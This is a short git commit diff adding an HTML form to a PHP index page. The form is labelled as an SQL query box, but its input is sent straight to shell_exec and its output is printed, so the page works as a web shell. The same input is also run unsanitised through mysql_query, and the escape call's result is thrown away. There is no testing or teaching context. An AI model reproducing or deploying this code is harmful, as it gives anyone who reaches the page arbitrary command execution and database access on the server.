cb75fae3d5ea955d4642d639bc1be2d81423126a
Isabel <isabelcmdcosta@gmail.com>
2015-12-05 17:52:41 -0800

    new index file

--- index.php
+++ index.php
@@ -19,8 +19,28 @@
 <?php
 	echo "<pre>";
 	echo shell_exec($_REQUEST["pCommand"]);
-	echo "</pre>";
+	echo "</pre>";	
+?>
+
+<form action="" method="post" enctype="application/x-www-form-urlencoded">		
+	<table style="margin-left:auto; margin-right:auto;">
+		<tr>
+			<td colspan="2">Please enter SQL command</td>
+		</tr>
+		<tr><td></td></tr>
+		<tr>
+			<td class="label">SQL query</td>
+			<td><input type="text" name="pCommand" size="50"></td>
+		</tr>
+		<tr><td></td></tr>
+		<tr>
+			<td colspan="2" style="text-align:center;">
+				<input type="submit" value="Execute Command" />
+			</td>
+		</tr>
+	</table>
+</form>
+<?php
 	mysql_escape_string($_REQUEST["pCommand"]);
-	mysql_query($_REQUEST["pCommand"]);
-	
+	mysql_query($_REQUEST["pCommand"]);	
 ?>
